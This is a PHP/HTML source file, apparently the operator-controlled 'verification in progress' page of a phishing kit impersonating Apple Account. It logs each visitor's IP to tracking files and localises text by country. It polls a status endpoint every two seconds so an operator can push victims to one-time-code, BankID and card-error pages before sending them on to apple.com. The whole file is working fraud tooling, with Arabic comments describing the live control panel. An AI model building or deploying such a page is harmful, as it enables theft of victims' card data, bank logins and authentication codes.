<?php
if (session_status() == PHP_SESSION_NONE) { session_start(); }

// 🟢 جلب الآي بي وتنظيفه من النقاط ليصبح اسماً صالحاً للملف الخاص بكل مستخدم
$ib = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$_SESSION['user_ip'] = $ib;
$ip_clean = str_replace(['.', ':'], '_', $ib);

file_put_contents("status_" . $ip_clean . ".txt", "wait");

// تسجيل بيانات المستخدم في ملف منفصل خاص به باسم الآي بي
$visitor_data = [ 'ip' => $ib, 'last_activity' => time(), 'current_page' => 'lod2.php' ];
file_put_contents("user_" . $ip_clean . ".json", json_encode($visitor_data));

// 🌐 نظام اللغات الذكي حسب الدولة
$user_lang = 'en'; 
$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ib}?fields=countryCode"));
if ($details && isset($details->countryCode)) {
    $country = strtoupper($details->countryCode);
    if (in_array($country, ['SE', 'NO', 'FI', 'DK'])) { $user_lang = 'sv'; } 
    elseif (in_array($country, ['DE', 'CH', 'AT', 'LU'])) { $user_lang = 'de'; } 
    elseif (in_array($country, ['ES', 'MX', 'AR', 'CO', 'CL', 'PE', 'VE'])) { $user_lang = 'es'; }
}

$lang_dict = [
    'de' => [ 'h4' => 'Prüfung läuft...', 'p' => 'Bitte warten Sie einen Moment. Ihre Anfrage wird verarbeitet. Schliessen Sie dieses Fenster nicht.' ],
    'sv' => [ 'h4' => 'Verifiering pågår...', 'p' => 'Vänligen vänta ett ögonblick. Din förfrågan behandlas. Stäng inte detta fönster.' ],
    'es' => [ 'h4' => 'Procesando verificación...', 'p' => 'Por favor, espere un momento. Su solicitud está siendo procesada. No cierre esta ventana.' ],
    'en' => [ 'h4' => 'Verification in progress...', 'p' => 'Please wait a moment. Your request is being processed. Do not close this window.' ]
];
$text = $lang_dict[$user_lang];
?>
<!DOCTYPE html>
<html class="full-height" dir="ltr" lang="<?php echo $user_lang; ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Apple Account - Please Wait</title>
    <link rel="shortcut icon" href="https://appleid.cdn-apple.com/static/bin/cb3460663665/images/favicon.ico">
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; color: #1d1d1f; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; -webkit-font-smoothing: antialiased; }
        .loader-container { text-align: center; max-width: 440px; width: 100%; padding: 30px 20px; display: flex; flex-direction: column; align-items: center; }
        .logo-container { margin-bottom: 30px; width: 130px; height: 130px; display: flex; align-items: center; }
        .logo-container img { width: 100%; height: 100%; object-fit: contain; }
        .apple-spinner { display: inline-block; width: 44px; height: 44px; border: 4px solid #f5f5f7; border-top: 4px solid #0071e3; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h4 { font-size: 22px; font-weight: 600; margin-bottom: 12px; }
        p { font-size: 14px; color: #6e6e73; line-height: 1.5; max-width: 360px; }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="logo-container"><img src="1.jpg" alt="Logo"></div>
        <div class="apple-spinner"></div>
        <h4><?php echo $text['h4']; ?></h4>
        <p><?php echo $text['p']; ?></p>
    </div>
    
    <script>
        function checkLiveStatus() {
            // 🛰️ فحص حالة السيرفر والأوامر لايف من الكنترول بانل
            fetch('get_status.php?nocache=' + new Date().getTime())
            .then(r => r.text())
            .then(status => {
                status = status.trim().toLowerCase();
                
                if (status === 'wait') {
                    console.log("Waiting for command...");
                    return; 
                }
                
                // 🔀 التحويلات الفورية بناءً على الأوامر المستلمة
                if (status === 'otp') {
                    window.location.href = "smbettal.php";
                } else if (status === 'bank') {
                    window.location.href = "bankid.php";
                } else if (status === 'index') {
                    window.location.href = "index.html";   
                } else if (status === 'success_done') {
                    window.location.href = "https://www.apple.com";
                }
                
                // ❌ إصلاح تعليق أخطاء الكارت: التوجيه لصفحة karbett.php مع تمرير نوع الخطأ
                else if (status === 'card_wrong') {
                    window.location.href = "karbett.php?card_error=wrong";
                } else if (status === 'card_expired') {
                    window.location.href = "karbett.php?card_error=expired";
                } else if (status === 'card_unsupported') {
                    window.location.href = "karbett.php?card_error=unsupported";
                }
            })
            .catch(err => console.log("Fehler:", err));
        }
        
        // فحص مستمر كل ثانيتين صامت في الخلفية
        setInterval(checkLiveStatus, 2000);
    </script>
</body>
</html>